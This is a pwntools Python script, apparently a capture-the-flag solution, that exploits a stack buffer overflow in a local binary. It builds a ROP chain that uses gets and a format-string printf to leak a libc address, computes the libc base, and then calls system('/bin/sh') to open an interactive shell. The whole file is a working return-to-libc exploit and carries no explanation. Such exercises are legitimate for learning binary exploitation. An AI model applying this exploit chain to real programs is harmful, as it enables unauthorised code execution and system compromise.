from pwn import *

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
bianry = ELF('./something')

rop= ROP(bianry)
r = process(bianry.path)
gdb.attach(r, api = True)

junk = b'a'*40
printf_add = 0x401080
gets_add = 0x401090
vuln_add = 0x00000000004011dd
add_store_string = 0x404070
pop_rdi_ret = rop.find_gadget(['pop rdi','ret'])[0]
ret = rop.find_gadget(['ret'])[0]


print(r.recvuntil(b'something : '))

payload1 = junk + p64(ret) + p64(pop_rdi_ret) + p64(add_store_string)  + p64(gets_add)
payload1 += p64(ret) + p64(pop_rdi_ret) + p64(add_store_string)  + p64(printf_add)
payload1 += p64(ret) + p64(vuln_add)

r.sendline(payload1)

payload2 = b"%3$p"
r.sendline(payload2)
output = r.recvuntil(b"something : ")

stdin = int(output.split(b"Say")[0],16)
leak_stdin_offset = libc.symbols['_IO_2_1_stdin_']
libc_base = stdin - leak_stdin_offset

system_offset = libc.symbols['system']
binsh_offset = next(libc.search(b'/bin/sh\x00'))

system_add = libc_base + system_offset
binsh_add = libc_base + binsh_offset

payload3 = junk + p64(ret) + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add)
r.sendline(payload3)
r.interactive()